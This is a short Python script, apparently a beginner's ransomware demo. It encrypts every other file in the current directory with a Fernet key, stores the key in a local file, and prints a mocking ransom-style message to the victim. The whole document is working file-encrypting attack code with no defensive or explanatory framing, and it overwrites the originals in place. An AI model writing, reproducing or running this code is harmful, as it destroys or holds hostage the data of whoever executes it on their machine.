#et's goooo
import os
from cryptography.fernet import *

files = []
Warnings = "Haha Fool Your all Files ar encrypted"
for file in os.listdir():
    if file == "main.py" or file == "thekeybruh.key" or file == "decrypt.py":
        continue
    elif os.path.isfile(file):
        files.append(file)


key = Fernet.generate_key()

with open("thekeybruh.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print(Warnings)
